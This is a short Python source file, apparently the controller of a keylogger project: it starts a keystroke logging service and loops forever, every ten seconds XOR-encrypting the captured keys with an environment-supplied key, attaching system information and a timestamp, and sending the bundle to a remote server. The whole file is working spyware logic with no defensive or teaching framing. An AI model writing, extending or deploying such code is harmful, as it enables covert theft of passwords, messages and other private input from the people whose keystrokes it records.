from EncryptedXor import EncryptedXor
from KeyLoggerService import KeyLoggerService
from networkWrier import SendData
from datetime import datetime
import time
import os
from  dotenv import load_dotenv

class KeyLoggerManager:
    load_dotenv()
    def __init__(self):
        self.start=KeyLoggerService()
        self.send_client=SendData()
        self.TIME=10
        self.xor = EncryptedXor()
        self.key = os.getenv('SECRET_KEY')

    def start_to_program(self):
        self.start.start_logging()

        while True:
           self.start.stop_logging()
           time.sleep(self.TIME)
           text =''.join(self.start.get_logged_keys())
           xor=self.xor.xor_encrypt(text,self.key)
           now=datetime.now().strftime('%d/%m/%Y %H:%M:%S')
           data_for_system=self.start.system_information()
           self.send_client.send_to_server({"time":now,"data":xor,"system":data_for_system})
           print("sent to server")
           self.start.data.clear()


s=KeyLoggerManager()
s.start_to_program()



